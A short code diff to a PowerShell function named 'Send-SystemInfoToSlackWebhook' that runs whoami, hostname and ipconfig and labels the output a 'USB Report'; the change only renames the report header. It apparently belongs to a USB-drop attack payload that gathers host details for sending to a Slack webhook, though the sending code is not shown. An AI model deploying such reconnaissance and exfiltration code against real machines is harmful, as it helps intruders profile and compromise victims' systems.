@@ -1,6 +1,6 @@
 function Send-SystemInfoToSlackWebhook {
     $commands = @("whoami", "hostname", "ipconfig")
-    $payload = "USB Drop - USB Report`n`n"
+    $payload = "$name - USB Report`n`n"
     
     foreach ($cmd in $commands) {
         $output = Invoke-Expression -Command $cmd
